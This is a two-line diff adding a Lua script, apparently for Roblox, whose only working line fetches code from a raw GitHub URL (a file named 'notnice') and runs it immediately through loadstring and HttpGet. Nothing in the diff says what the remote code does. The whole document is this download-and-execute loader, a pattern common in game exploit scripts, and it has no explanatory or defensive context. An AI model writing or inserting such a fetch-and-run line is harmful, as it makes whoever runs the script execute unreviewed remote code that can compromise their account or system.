@@ -1,0 +1,2 @@
+-- lets go
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptmakerl1/nice./main/notnice"))()
